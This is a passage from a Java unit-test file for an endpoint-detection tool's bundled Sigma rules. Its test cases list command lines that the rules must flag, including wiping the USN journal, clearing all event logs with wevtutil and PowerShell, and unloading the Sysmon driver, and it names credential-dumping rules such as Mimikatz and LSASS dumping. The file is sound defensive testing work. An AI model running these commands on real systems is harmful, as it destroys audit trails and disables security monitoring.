                            proc("gpg.exe", "C:\\Program Files (x86)\\GnuPG\\bin\\gpg.exe --list-keys"))),
            c("FSUTIL_USAGE", Alert.SEV_MEDIUM,
                    List.of(proc("fsutil.exe", SYS + "fsutil.exe usn deletejournal /D C:"),
                            proc("fsutil.exe", SYS + "fsutil.exe  file setZeroData offset=0 length=10 C:\\ExternalPayloads\\T1070-2.txt")),
                    List.of(proc("fsutil.exe", SYS + "fsutil.exe volume diskfree C:"),
                            proc("fsutil.exe", SYS + "fsutil.exe usn queryjournal C:"))),
            c("EVENTLOG_CLEAR", Alert.SEV_MEDIUM,
                    List.of(proc("wevtutil.exe", SYS + "wevtutil.exe cl System"),
                            proc("wevtutil.exe", SYS + "wevtutil.exe cl \"Application\""),
                            script("powershell.exe", PS + "-NoProfile -Command \"Get-EventLog -List | ForEach-Object {Clear-EventLog -LogName $_.Log}\"")),
                    List.of(proc("wevtutil.exe", SYS + "wevtutil.exe qe System /c:5 /f:text"),
                            proc("wevtutil.exe", SYS + "wevtutil.exe el"),
                            script("powershell.exe", PS + "Get-EventLog -List"),
                            // 원본의 msiexec 필터: 설치 프로그램이 로그 설정(sl)을 바꾸는 것
                            childOf("msiexec.exe", "wevtutil.exe", SYS + "wevtutil.exe sl Application /ms:20480"))),
            c("FLTMC_UNLOAD_SYSMON", Alert.SEV_MEDIUM,
                    List.of(proc("fltMC.exe", SYS + "fltmc.exe unload SysmonDrv")),
                    List.of(proc("fltMC.exe", SYS + "fltmc.exe filters"),
                            proc("fltMC.exe", SYS + "fltmc.exe unload MyAvFilter"))));

    static final List<Case> CASES = Stream.concat(BASE_CASES.stream(), ART_CASES.stream()).toList();

    private static final Map<String, SigmaRule> BY_ID = BUNDLED.current().stream()
            .collect(Collectors.toMap(SigmaRule::ruleId, r -> r));

    static Stream<Case> cases() {
        return CASES.stream();
    }

    @ParameterizedTest(name = "{0}")
    @MethodSource("cases")
    @DisplayName("번들 룰: 걸릴 이벤트는 걸리고 아닌 것은 안 걸린다")
    void rule_firesOnPositives_notOnNegatives(Case c) {
        SigmaRule rule = BY_ID.get(c.ruleId());

        assertThat(rule).as("번들에 %s 가 있다", c.ruleId()).isNotNull();
        assertThat(rule.severity()).isEqualTo(c.severity());
        for (Event e : c.positives()) {
            assertThat(rule.matches(e)).as("걸려야 한다: %s", e.getCmdline() + e.getDomain()).isTrue();
        }
        for (Event e : c.negatives()) {
            assertThat(rule.matches(e)).as("걸리면 안 된다: %s", e.getCmdline() + e.getDomain()).isFalse();
        }
    }

    @Test
    @DisplayName("번들 룰은 전부 읽히고, 룰마다 테스트 케이스가 있다 (40~60개)")
    void everyBundledRule_isLoaded_andTested() throws IOException {
        int files = new PathMatchingResourcePatternResolver().getResources("classpath*:rules/*.yml").length;
        Set<String> tested = CASES.stream().map(Case::ruleId).collect(Collectors.toSet());

        assertThat(BUNDLED.current()).hasSize(files);
        assertThat(BY_ID.keySet()).isEqualTo(tested);
        assertThat(files).isBetween(40, 60);
    }

    @Test
    @DisplayName("종료(kill)를 권고하는 번들 룰은 명백히 악성인 다섯 개뿐이고 CRITICAL 은 없다")
    void onlyClearlyMaliciousRules_recommendKill() {
        Set<String> high = BUNDLED.current().stream()
                .filter(r -> !r.severity().equals(Alert.SEV_MEDIUM))
                .peek(r -> assertThat(r.severity()).isEqualTo(Alert.SEV_HIGH))
                .map(SigmaRule::ruleId).collect(Collectors.toSet());

        assertThat(high).containsExactlyInAnyOrder("MIMIKATZ_COMMAND_LINE", "REG_DUMP_SENSITIVE_HIVES",
                "POWERSHELL_SHADOWCOPY_DELETE", "WBADMIN_DELETE_ALL_BACKUPS", "PROCDUMP_LSASS");
    }

    @Test
    @DisplayName("Rules.evaluate 를 거치면 번들 룰이 알림이 되고 high 는 kill, 나머지는 notify")
    void viaRules_alertCarriesRuleMetadata() {
        Alert kill = Rules.evaluate(List.of(), CASES.get(0).positives().get(0), BUNDLED.current()).orElseThrow();
        Alert notify = Rules.evaluate(List.of(), CASES.get(1).positives().get(0), BUNDLED.current()).orElseThrow();

        assertThat(kill.ruleId()).isEqualTo("MIMIKATZ_COMMAND_LINE");
        assertThat(kill.mitre()).isEqualTo("T1003.001");
        assertThat(kill.action()).isEqualTo(Alert.ACTION_KILL);
        assertThat(notify.ruleId()).isEqualTo("CERTUTIL_DOWNLOAD");
        assertThat(notify.mitre()).isEqualTo("T1105");
        assertThat(notify.action()).isEqualTo(Alert.ACTION_NOTIFY);
    }
}
